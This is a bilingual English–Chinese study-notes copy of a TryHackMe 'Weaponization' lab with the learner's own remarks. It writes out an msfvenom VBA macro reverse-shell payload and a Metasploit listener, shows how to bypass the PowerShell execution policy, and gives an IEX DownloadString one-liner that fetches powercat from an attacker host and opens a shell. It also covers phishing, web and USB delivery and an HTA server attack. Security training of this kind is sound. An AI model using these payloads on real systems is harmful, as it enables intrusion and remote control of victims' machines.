<font style="color:rgb(21, 28, 43);">Make sure to test your code before saving the document by using the running feature in the editor. Make sure to create</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">AutoOpen()</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">and</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">Document_open()</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">functions before saving the document. Once the code works, now save the file and try to open it again.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">请确保在使用编辑器中的运行功能保存文档之前测试代码。在保存文档之前，请确保创建 AutoOpen（） 和 Document_open（） 函数。代码工作后，现在保存文件并尝试再次打开它。</font><font style="color:rgb(21, 28, 43);">  
</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712041702292-772d426b-64a1-4ccc-85e9-1df423665ac9.png)

<font style="color:rgb(21, 28, 43);">It is important to mention that we can combine VBAs with previously covered methods, such as HTAs and WSH. VBAs/macros by themselves do not inherently bypass any detections.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">值得一提的是，我们可以将 VBA 与前面介绍的方法（例如 HTA 和 WSH）结合使用。VBA/宏本身本身不会绕过任何检测。</font>

<font style="color:rgb(235, 0, 55);">Answer the questions below</font><font style="color:rgb(235, 0, 55);">  
</font><font style="color:rgb(235, 0, 55);">回答以下问题</font>

<font style="color:rgb(21, 28, 43);">Now let's create an in-memory meterpreter payload using the Metasploit framework to receive a reverse shell. First, from the AttackBox, we create our meterpreter payload using </font><font style="color:rgb(235, 87, 87);">msfvenom</font><font style="color:rgb(21, 28, 43);">. We need to specify the </font><font style="color:rgb(235, 87, 87);">Payload</font><font style="color:rgb(21, 28, 43);">,</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">LHOST</font><font style="color:rgb(21, 28, 43);">, </font><font style="color:rgb(21, 28, 43);">and </font><font style="color:rgb(235, 87, 87);">LPORT,</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">which match what is in the Metasploit framework. Note that we specify the payload as </font><font style="color:rgb(235, 87, 87);">VBA</font><font style="color:rgb(21, 28, 43);"> to use it as a macro.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">现在，让我们使用 Metasploit 框架创建一个内存中的 meterpreter 有效负载来接收反向 shell。首先，在 AttackBox 中，我们使用 msfvenom 创建 meterpreter 有效负载。我们需要指定 PayloadLHOST 和 LPORT，它们与 Metasploit 框架中的内容相匹配。请注意，我们将有效负载指定为 VBA 以将其用作宏。</font>

<font style="color:white;background-color:rgb(62, 69, 82);">Terminal</font><font style="color:white;background-color:rgb(62, 69, 82);"> </font><font style="color:white;background-color:rgb(62, 69, 82);">终端</font>

<font style="color:rgb(21, 28, 43);">The value of the </font><font style="color:rgb(235, 87, 87);">LHOST</font><font style="color:rgb(21, 28, 43);"> in the above terminal </font><font style="color:rgb(21, 28, 43);">is an example of AttackBox's IP address that we used. In your case, you need to specify the IP address of your AttackBox.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">上述终端中 LHOST 的值是我们使用的 AttackBox IP 地址的一个示例。在您的情况下，您需要指定 AttackBox 的 IP 地址。</font>

**<font style="color:rgb(21, 28, 43);">Import to note</font>**<font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">that one modification needs to be done to make this work.  The output will be working on an MS excel sheet. Therefore, change the </font><font style="color:rgb(235, 87, 87);">Workbook_Open()</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">to </font><font style="color:rgb(235, 87, 87);">Document_Open()</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">to make it suitable for MS word documents.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">导入时要注意，需要进行一次修改才能使其正常工作。输出将在 MS Excel 工作表上工作。因此，将 Workbook_Open（） 更改为 Document_Open（） 以使其适用于 MS word 文档。</font>

<font style="color:rgb(21, 28, 43);">Now copy the output and save it into the macro editor of the MS word document, as we showed previously.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">现在复制输出并将其保存到 MS word 文档的宏编辑器中，正如我们之前所示。</font>

<font style="color:rgb(21, 28, 43);">From the attacking machine, run the Metasploit framework and set the listener as follows:</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">在攻击机器上，运行 Metasploit 框架并设置侦听器，如下所示：</font>

<font style="color:white;background-color:rgb(62, 69, 82);">Terminal</font><font style="color:white;background-color:rgb(62, 69, 82);"> </font><font style="color:white;background-color:rgb(62, 69, 82);">终端</font>

<font style="color:rgb(21, 28, 43);">Once the malicious MS word document is opened on the victim machine, we should receive a reverse shell.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">一旦在受害机器上打开恶意 MS Word 文档，我们应该会收到一个反向 shell。</font>

<font style="color:white;background-color:rgb(62, 69, 82);">Terminal</font><font style="color:white;background-color:rgb(62, 69, 82);"> </font><font style="color:white;background-color:rgb(62, 69, 82);">终端</font>

```plain
user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of vba file: 2698 bytes
```

```plain
user@AttackBox$ msfconsole -q
msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.50.159.15
LHOST => 10.50.159.15
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443
```

```plain
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.50.159.15:443 
[*] Sending stage (176195 bytes) to 10.10.215.43
[*] Meterpreter session 1 opened (10.50.159.15:443 -> 10.10.215.43:50209) at 2021-12-13 10:46:05 +0000
meterpreter >
```

<font style="color:rgb(21, 28, 43);"></font>

# <font style="color:rgb(21, 28, 43);">PowerShell (PSH) </font>
<u><font style="color:rgb(21, 28, 43);">PowerShell</font></u><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in </font><font style="color:rgb(235, 87, 87);">.NET</font><font style="color:rgb(21, 28, 43);"> with some exceptions for legacy uses. Check out the TryHackMe room,</font><font style="color:rgb(21, 28, 43);"> </font>[<font style="color:rgb(21, 28, 43);">Hacking withPowerShellfor more information aboutPowerShell</font>](https://tryhackme.com/room/powershell)<font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">PowerShell 是一种面向对象的编程语言，从 .NET 中的动态语言运行时 （DLR） 执行，但旧用途有一些例外。有关 PowerShell 的详细信息，请查看 TryHackMe 聊天室 Hacking with PowerShell</font><font style="color:rgb(21, 28, 43);">.</font><font style="color:rgb(21, 28, 43);">  
</font>

<font style="color:rgb(21, 28, 43);">Red teamers rely on PowerShell in performing various activities, including initial access, system enumerations, and many others. </font><font style="color:rgb(21, 28, 43);">Let's start by creating a straightforward PowerShell script that prints "</font><font style="color:rgb(21, 28, 43);">Welcome to the Weaponization Room!</font><font style="color:rgb(21, 28, 43);">" as follows,</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">红队成员依靠 PowerShell 执行各种活动，包括初始访问、系统枚举等。让我们首先创建一个简单的 PowerShell 脚本，该脚本打印“欢迎来到武器化室！”，如下所示：</font>

```powershell
Write-Output "Welcome to the Weaponization Room!"
```

<font style="color:rgb(21, 28, 43);">Save the file as </font><font style="color:rgb(235, 87, 87);">thm.ps1</font><font style="color:rgb(21, 28, 43);">. </font><font style="color:rgb(21, 28, 43);">With the </font><font style="color:rgb(235, 87, 87);">Write-Output</font><font style="color:rgb(21, 28, 43);">, we print the message "Welcome to the Weaponization Room!" to the command prompt. </font><font style="color:rgb(21, 28, 43);">Now let's run it and see the result.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">将文件另存为 thm.ps1。使用写输出，我们将消息“欢迎来到武器化室！现在让我们运行它并查看结果。</font>

<font style="color:white;background-color:rgb(62, 69, 82);">CMD</font>



```plain
C:\Users\thm\Desktop>powershell -File thm.ps1
File C:\Users\thm\Desktop\thm.ps1 cannot be loaded because running scripts is disabled on this system. For more
information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
    + CategoryInfo          : SecurityError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnauthorizedAccess

C:\Users\thm\Desktop>
```

<font style="color:rgb(21, 28, 43);">Execution Policy</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">执行策略</font>

<font style="color:rgb(21, 28, 43);">PowerShell's execution policy is a </font>**<font style="color:rgb(21, 28, 43);">security option</font>**<font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">to protect the system from running malicious scripts. By default, Microsoft disables executing PowerShell scripts</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">.ps1</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">for security purposes. The PowerShell execution policy is set to</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">Restricted</font><font style="color:rgb(21, 28, 43);">, which means it permits individual commands but not run any scripts.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">PowerShell 的执行策略是一个安全选项，用于保护系统免受恶意脚本的运行。默认情况下，出于安全目的，Microsoft 禁止执行 PowerShell 脚本 .ps1。PowerShell 执行策略设置为“受限”，这意味着它允许单个命令，但不允许运行任何脚本。</font><font style="color:rgb(21, 28, 43);">  
</font>

<font style="color:rgb(21, 28, 43);">You can determine the current</font><font style="color:rgb(21, 28, 43);"> </font><u><font style="color:rgb(21, 28, 43);">PowerShell</font></u><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">setting of your Windows as follows,</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">可以按如下方式确定 Windows 的当前 PowerShell 设置：</font>

<font style="color:white;background-color:rgb(62, 69, 82);">CMD</font>



```plain
PS C:\Users\thm> Get-ExecutionPolicy
Restricted
```

<font style="color:rgb(21, 28, 43);">We can also easily change the</font><font style="color:rgb(21, 28, 43);"> </font><u><font style="color:rgb(21, 28, 43);">PowerShell</font></u><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">execution policy by running:</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">我们还可以通过运行以下命令轻松更改 PowerShell 执行策略：</font>

<font style="color:white;background-color:rgb(62, 69, 82);">CMD</font>



```plain
PS C:\Users\thm\Desktop> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
http://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is "N"): A
```

<font style="color:rgb(21, 28, 43);">Bypass Execution Policy</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">绕过执行策略</font>

<font style="color:rgb(21, 28, 43);">Microsoft provides ways to disable this restriction. One of these ways is by giving an argument option to the PowerShell command to change it to your desired setting. For example, we can change it to</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(235, 87, 87);">bypass</font><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">policy which means nothing is blocked or restricted. This is useful since that lets us run our own PowerShell scripts.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">Microsoft 提供了禁用此限制的方法。其中一种方法是为 PowerShell 命令提供参数选项，以将其更改为所需的设置。例如，我们可以将其更改为绕过策略，这意味着不会阻止或限制任何内容。这很有用，因为它允许我们运行自己的 PowerShell 脚本。</font><font style="color:rgb(21, 28, 43);">  
</font>

<font style="color:rgb(21, 28, 43);">In order to make sure our </font><u><font style="color:rgb(21, 28, 43);">PowerShell</font></u><font style="color:rgb(21, 28, 43);"> file gets executed, we need to provide the bypass option in the arguments as follows,  
</font><font style="color:rgb(21, 28, 43);">为了确保我们的 PowerShell 文件得到执行，我们需要在参数中提供绕过选项，如下所示：</font>

```plain
C:\Users\thm\Desktop>powershell -ex bypass -File thm.ps1
Welcome to Weaponization Room!
```

<font style="color:rgb(55, 53, 47);">Now, let's try to get a reverse shell using one of the tools written in </font><u><font style="color:rgb(55, 53, 47);">PowerShell</font></u><font style="color:rgb(55, 53, 47);">, which is </font><font style="color:rgb(235, 87, 87);">powercat</font><font style="color:rgb(55, 53, 47);">. On your AttackBox, download it from GitHub and run a webserver to deliver the payload.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">现在，让我们尝试使用用 PowerShell 编写的工具之一（powercat）来获取反向 shell。在 AttackBox 上，从 GitHub 下载它并运行 Web 服务器以提供有效负载。</font><font style="color:rgb(21, 28, 43);"></font>

```plain
user@machine$ git clone https://github.com/besimorhino/powercat.git
Cloning into 'powercat'...
remote: Enumerating objects: 239, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 239 (delta 0), reused 2 (delta 0), pack-reused 235
Receiving objects: 100% (239/239), 61.75 KiB | 424.00 KiB/s, done.
Resolving deltas: 100% (72/72), done.
```

<font style="color:rgb(21, 28, 43);">Now, we need to set up a web server on that AttackBox to serve the </font><font style="color:rgb(235, 87, 87);">powercat.ps1</font><font style="color:rgb(21, 28, 43);">that will be downloaded and executed on the target machine. Next, change the directory to powercat and start listening on a port of your choice. In our case, we will be using port </font><font style="color:rgb(235, 87, 87);">8080</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">现在，我们需要在该 AttackBox 上设置一个 Web 服务器，以提供将在目标计算机上下载和执行的 powercat.ps1。接下来，将目录更改为 powercat 并开始侦听您选择的端口。在本例中，我们将使用端口 8080</font><font style="color:rgb(55, 53, 47);">.</font>

```plain
user@machine$ cd powercat
user@machine$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

<font style="color:rgb(21, 28, 43);">On the AttackBox, we need to listen on port </font><font style="color:rgb(235, 87, 87);">1337</font><font style="color:rgb(21, 28, 43);"> using </font><font style="color:rgb(235, 87, 87);">nc</font><font style="color:rgb(21, 28, 43);"> to receive the connection back from the victim.  
</font><font style="color:rgb(21, 28, 43);">在 AttackBox 上，我们需要使用 nc 侦听端口 1337 以接收来自受害者的连接。</font>

```plain
user@machine$ nc -lvp 1337
```

<font style="color:rgb(21, 28, 43);">Now, from the victim machine, we download the payload and execute it using </font><u><font style="color:rgb(21, 28, 43);">PowerShell</font></u><font style="color:rgb(21, 28, 43);"> payload as follows,  
</font><font style="color:rgb(21, 28, 43);">现在，我们从受害计算机下载有效负载并使用 PowerShell 有效负载执行它，如下所示：</font>

```plain
C:\Users\thm\Desktop> powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
```

<font style="color:rgb(21, 28, 43);">Now that we have executed the command above, the victim machine downloads the </font><font style="color:rgb(235, 87, 87);">powercat.ps1</font><font style="color:rgb(21, 28, 43);">  payload from our web server (on the AttackBox) and then executes it locally on the target using </font><font style="color:rgb(235, 87, 87);">cmd.exe</font><font style="color:rgb(21, 28, 43);"> and sends a connection back to the AttackBox that is listening on port </font><font style="color:rgb(235, 87, 87);">1337</font><font style="color:rgb(21, 28, 43);">. After a couple of seconds, we should receive the connection call back:  
</font><font style="color:rgb(21, 28, 43);">现在我们已经执行了上面的命令，受害计算机从我们的 Web 服务器（在 AttackBox 上）下载 powercat.ps1 有效负载，然后使用 cmd.exe 在目标上本地执行它，并将连接发送回正在侦听 port1337 的 AttackBox。几秒钟后，我们应该会收到连接回调：</font>

```plain
user@machine$ nc -lvp 1337  listening on [any] 1337 ...
10.10.12.53: inverse host lookup failed: Unknown host
connect to [10.8.232.37] from (UNKNOWN) [10.10.12.53] 49804
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\thm>
```



# <font style="color:rgb(21, 28, 43);">Delivery Techniques 交付技术  
</font>
<font style="color:rgb(21, 28, 43);">Delivery techniques are one of the important factors for getting initial access. They have to look professional, legitimate, and convincing to the victim in order to follow through with the content.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">交付技术是获得初始访问权限的重要因素之一。他们必须看起来专业、合法且对受害者有说服力，才能跟进内容。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712042728743-7cc1d490-94ac-4e30-8d48-79aa561a6e7d.png)<font style="color:rgb(21, 28, 43);">  
</font>

<font style="color:rgb(21, 28, 43);">  
</font>

## <font style="color:rgb(21, 28, 43);">Email Delivery 电子邮件传递  
</font>
<font style="color:rgb(21, 28, 43);">It is a common method to use in order to send the payload by sending a phishing email with a link or attachment. For more info, visit</font><font style="color:rgb(21, 28, 43);"> </font>[here](https://attack.mitre.org/techniques/T1566/001/)<font style="color:rgb(21, 28, 43);">. This method attaches a malicious file that could be the type we mentioned earlier. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim's network or host.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">这是一种常用的方法，用于通过发送带有链接或附件的网络钓鱼电子邮件来发送有效负载。欲了解更多信息，请访问这里。此方法附加了一个恶意文件，该文件可能是我们前面提到的类型。目标是说服受害者访问恶意网站或下载并运行恶意文件，以获得对受害者网络或主机的初始访问权限。</font>

<font style="color:rgb(21, 28, 43);">The red teamers should have their own infrastructure for phishing purposes. Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and</font><font style="color:rgb(21, 28, 43);"> </font><u><font style="color:rgb(21, 28, 43);">DNS</font></u><font style="color:rgb(21, 28, 43);"> </font><font style="color:rgb(21, 28, 43);">Pointer (PTR) record.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">红队成员应该有自己的基础设施来进行网络钓鱼。根据红队参与要求，它需要在电子邮件服务器中设置各种选项，包括域名密钥识别邮件 （DKIM）、发件人策略框架 （SPF） 和 DNS 指针 （PTR） 记录。</font>

<font style="color:rgb(21, 28, 43);">The red teamers could also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">红队成员还可以使用第三方电子邮件服务，例如 Google Gmail、Outlook、Yahoo 和其他声誉良好的服务。</font>

<font style="color:rgb(21, 28, 43);">Another interesting method would be to use a compromised email account within a company to send phishing emails within the company or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">另一种有趣的方法是使用公司内部受损的电子邮件帐户在公司内部或向其他人发送网络钓鱼电子邮件。受感染的电子邮件可能会被网络钓鱼或其他技术（例如密码喷射攻击）入侵。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712042729719-b0baa702-4683-47c1-80e7-b904cc1f1a50.png)<font style="color:rgb(21, 28, 43);">  
</font>

## <font style="color:rgb(21, 28, 43);">Web Delivery Web 交付  
</font>
<font style="color:rgb(21, 28, 43);">Another method is hosting malicious payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and TLS (Transport Layer Security) certificate. For more information, visit</font><font style="color:rgb(21, 28, 43);"> </font>[here](https://attack.mitre.org/techniques/T1189/)<font style="color:rgb(21, 28, 43);">.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">另一种方法是在由红队成员控制的 Web 服务器上托管恶意负载。Web 服务器必须遵循安全准则，例如其域名和 TLS（传输层安全性）证书的干净记录和信誉。欲了解更多信息，请访问这里。</font>

<font style="color:rgb(21, 28, 43);">This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener could be helpful when using this method.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">此方法包括其他技术，例如社会工程受害者访问或下载恶意文件。使用此方法时，URL 缩短器可能会有所帮助。</font>

<font style="color:rgb(21, 28, 43);">In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">在这种方法中，可以组合和使用其他技术。攻击者可以利用零日漏洞，例如利用 Java 或浏览器等易受攻击的软件，在网络钓鱼电子邮件或 Web 交付技术中使用它们来访问受害计算机。</font>

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712042729036-25a10b2d-800c-40a7-97f0-f8487b14ec1f.png)<font style="color:rgb(21, 28, 43);">  
</font>

## <font style="color:rgb(21, 28, 43);">USB Delivery USB 传输  
</font>
<font style="color:rgb(21, 28, 43);">This method requires the victim to plug in the malicious USB physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. For more information about USB delivery, visit</font><font style="color:rgb(21, 28, 43);"> </font>[here](https://attack.mitre.org/techniques/T1091/)<font style="color:rgb(21, 28, 43);">.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">此方法要求受害者物理插入恶意 USB。此方法在对手可以分发 USB 的会议或活动中可能有效且有用。有关 USB 传输的更多信息，请访问此处。</font>

<font style="color:rgb(21, 28, 43);">Often, organizations establish strong policies such as disabling USB usage within their organization environment for security purposes. While other organizations allow it in the target environment.</font><font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">通常，组织会建立强有力的策略，例如出于安全目的在其组织环境中禁用 USB 使用。而其他组织则允许在目标环境中使用它。</font>

<font style="color:rgb(21, 28, 43);">Common USB attacks used to weaponize USB devices include </font>[Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky-deluxe)<font style="color:rgb(21, 28, 43);"> and </font>[USBHarpoon](https://www.minitool.com/news/usbharpoon.html)<font style="color:rgb(21, 28, 43);">, charging USB cable, such as </font>[O.MG Cable](https://shop.hak5.org/products/omg-cable)<font style="color:rgb(21, 28, 43);">  
</font><font style="color:rgb(21, 28, 43);">用于武器化 USB 设备的常见 USB 攻击包括 Rubber Ducky 和 USBHarpoon，为 USB 电缆充电，例如 O.MG 电缆.</font>

<font style="color:rgb(21, 28, 43);"></font>

# <font style="color:rgb(31, 31, 31);">Practice Arena</font>
![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712043659688-58936109-bff4-4746-9a7f-c91bd44f89d7.png)

这里使用metasploit的hta_server

##### <font style="color:rgb(79, 79, 79);">Metasploit HTA WebServer</font>
通过 Metasploit 的 HTA Web Server 模块发起 HTA 攻击



> use exploit/windows/misc/hta_server 
>
> set srvhost 10.10.212.121
>
> set payload windows/x64/meterpreter/reverse_tcp 
>
> set target 1 
>
> run -j
>
> //目标windowx上执行
>
> [http://10.10.212.121:8080/wSIlcWV8au.hta](http://10.10.212.121:8080/wSIlcWV8au.hta)
>

又出现意外了

死活不弹

换个攻击盒子吧

之后成功了

测试半天执行命令，发现执行的是攻击盒子（本机）

sessions -i 1   返回监听界面

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712046905040-d2e6aff6-8971-4fc9-9b8f-d7f5298ff6bd.png)

这个时候没有交互shell

直接输入shell即可

![](https://cdn.nlark.com/yuque/0/2024/png/40628873/1712046920175-500edf89-39f5-4b26-b1e4-6298488de1d8.png)

吐了搞了一节课

